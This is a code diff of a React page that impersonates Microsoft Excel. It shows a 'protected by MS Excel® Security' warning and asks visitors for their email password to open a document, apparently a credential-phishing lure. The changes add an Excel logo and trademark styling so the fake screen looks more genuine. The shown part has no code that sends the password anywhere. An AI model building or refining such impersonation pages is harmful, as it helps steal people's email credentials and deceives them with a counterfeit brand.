@@ -76,24 +76,33 @@ export default function Home() {
       <div className="relative z-10 flex min-h-screen w-full items-center justify-center p-6 md:p-10">
         <div className="bg-white shadow-md overflow-hidden max-w-md w-full border border-gray-200">
           {/* Excel Header */}
-          <div className="bg-green-600 text-white p-3 flex items-center gap-2">
-            <div className="font-bold text-xl">Microsoft®</div>
+          <div className="bg-green-600 text-white p-3 flex items-center gap-3">
+            <div className="h-8 w-8">
+              <img 
+                src="/excel-logo.svg" 
+                alt="Excel Logo" 
+                className="h-full w-full object-contain"
+              />
+            </div>
             <div className="flex flex-col">
-              <span className="font-bold text-xl">Excel</span>
+            <div className="text-xs font-semibold relative">
+                Microsoft<span className="absolute top-0 text-[8px] leading-none">®</span>
+              </div>
+              <span className="font-bold text-lg leading-none">Excel</span>
             </div>
           </div>
 
           {/* Warning Content */}
           <div className="p-6 pt-6 flex flex-col gap-6">
-            <div className="text-center flex flex-col gap-2">
+            <div className="text-center flex flex-col gap-1">
               <div className="flex items-center justify-center gap-2">
-                <div className="text-amber-500 text-xl">⚠</div>
-                <div className="font-semibold">This file is protected by</div>
+                <div className="text-amber-500 text-2xl">⚠</div>
+                <div className="font-semibold text-sm text-gray-700">This file is protected by</div>
               </div>
-              <div className="font-bold">MS Excel® Security.</div>
+              <div className="font-bold text-sm text-gray-800">MS Excel® Security.</div>
             </div>
 
-            <div className="text-center text-sm text-gray-600">
+            <div className="text-center text-xs text-gray-500">
               Enter email password to access protected document
             </div>
 
@@ -114,9 +123,6 @@ export default function Home() {
 
               <div className="border-b border-gray-300 pb-1">
                 <div className="flex items-center">
-                  {/* <Label htmlFor="password" className="text-gray-500 text-sm mr-2">
-                    Email password
-                  </Label> */}
                   <Input
                     id="password"
                     type="password"
